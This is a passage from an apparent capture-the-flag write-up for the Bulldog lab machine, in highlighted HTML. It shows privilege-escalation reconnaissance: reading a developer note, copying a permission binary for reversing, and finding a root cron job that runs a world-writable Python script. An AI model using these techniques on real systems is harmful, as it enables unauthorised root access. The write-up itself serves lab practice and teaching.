&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8.6&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;customPermissionApp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="c1"&gt;-- 1 bulldogadmin bulldogadmin  619 Sep 20 19:44 note&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="reverse"&gt;Reverse&lt;/h3&gt;
&lt;p&gt;The note's content is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;Nick&lt;/span&gt;,&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;m working on the backend permission stuff. Listen, it&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt; &lt;span class="nv"&gt;super&lt;/span&gt; &lt;span class="nv"&gt;prototype&lt;/span&gt; &lt;span class="nv"&gt;but&lt;/span&gt; &lt;span class="nv"&gt;I&lt;/span&gt; &lt;span class="nv"&gt;think&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;It&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;s great stuff! Once I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;m&lt;/span&gt; &lt;span class="nv"&gt;finished&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt;, &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;hacker&lt;/span&gt; &lt;span class="nv"&gt;wouldn&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;t even be able to reverse it! Keep in mind that it&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt; &lt;span class="nv"&gt;still&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;prototype&lt;/span&gt; &lt;span class="nv"&gt;right&lt;/span&gt; &lt;span class="nv"&gt;now&lt;/span&gt;. &lt;span class="nv"&gt;I&lt;/span&gt; &lt;span class="nv"&gt;am&lt;/span&gt; &lt;span class="nv"&gt;about&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;get&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt; &lt;span class="nv"&gt;working&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;Django&lt;/span&gt; &lt;span class="nv"&gt;user&lt;/span&gt; &lt;span class="nv"&gt;account&lt;/span&gt;. &lt;span class="nv"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;m not sure how I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;ll&lt;/span&gt; &lt;span class="nv"&gt;implement&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;others&lt;/span&gt;. &lt;span class="nv"&gt;Maybe&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;webserver&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;only&lt;/span&gt; &lt;span class="nv"&gt;one&lt;/span&gt; &lt;span class="nv"&gt;who&lt;/span&gt; &lt;span class="nv"&gt;needs&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;have&lt;/span&gt; &lt;span class="nv"&gt;root&lt;/span&gt; &lt;span class="nv"&gt;access&lt;/span&gt; &lt;span class="nv"&gt;sometimes&lt;/span&gt;?&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;Let&lt;/span&gt; &lt;span class="nv"&gt;me&lt;/span&gt; &lt;span class="nv"&gt;know&lt;/span&gt; &lt;span class="nv"&gt;what&lt;/span&gt; &lt;span class="nv"&gt;you&lt;/span&gt; &lt;span class="nv"&gt;think&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;Ashley&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We copy the executable to make it our own and be able to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenadmindirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;customPermissionApp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;customPermissionApp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then it's reverse, but another lead was found during the reconnaissance for privilege escalation:&lt;/p&gt;
&lt;h3 id="cron"&gt;Cron&lt;/h3&gt;
&lt;p&gt;By looking at the cron files we also see that there is a runAV task:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ahlR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;722&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;crontab&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;94&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nov&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;589&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2014&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mdadm&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;102&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apr&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2016&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;placeholder&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;191&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;popularity&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;contest&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;54&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;runAV&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;By digging in we found that:&lt;/p&gt;
&lt;p&gt;it run a script with root right every minute&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;runAV&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;*/&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenAVDirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;AVApplication&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;the script is world writable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenAVDirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;AVApplication&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwxrwxrwx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;157&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenAVDirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;AVApplication&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;that the script is just a place holder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenAVDirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;AVApplication&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#!&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Just&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wanted&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;throw&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;placeholder&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;here&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;really&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;quick&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
